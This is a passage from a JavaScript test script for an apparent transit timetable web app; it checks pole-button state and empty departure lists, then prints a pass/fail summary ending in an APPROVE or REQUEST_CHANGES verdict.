    assert(!dom.elements.get('pole-btn-kamiooka-6').classList.contains('active'), 'Pole button 6 removed active class');

    // 4.7: Empty Departures Render
    const emptyDepartures = timetableService.getNextDepartures([], new Date(), 10);
    assert(emptyDepartures.length === 0, 'Empty departures array returns 0 length');

  } finally {
    globalThis.document = originalDoc;
  }
}

await testAppDOMIntegration();

// =============================================================================
// SUMMARY & VERDICT CALCULATION
// =============================================================================
console.log('\n========================================================================');
console.log('📊 EMPIRICAL ADVERSARIAL TEST RESULTS SUMMARY');
console.log('========================================================================');
console.log(`Total Assertions Checked: ${totalTests}`);
console.log(`Passed:                   ${passedTests}`);
console.log(`Failed:                   ${failedTests}`);
console.log('========================================================================');

if (failedTests > 0) {
  console.error('\n❌ FAILURE LOG:');
  testFailures.forEach((f, i) => console.error(`  ${i + 1}. ${f}`));
  console.log('\nVERDICT: REQUEST_CHANGES');
} else {
  console.log('\n🎉 ALL EMPIRICAL ADVERSARIAL CHALLENGES PASSED PERFECTLY!');
  console.log('VERDICT: APPROVE');
}
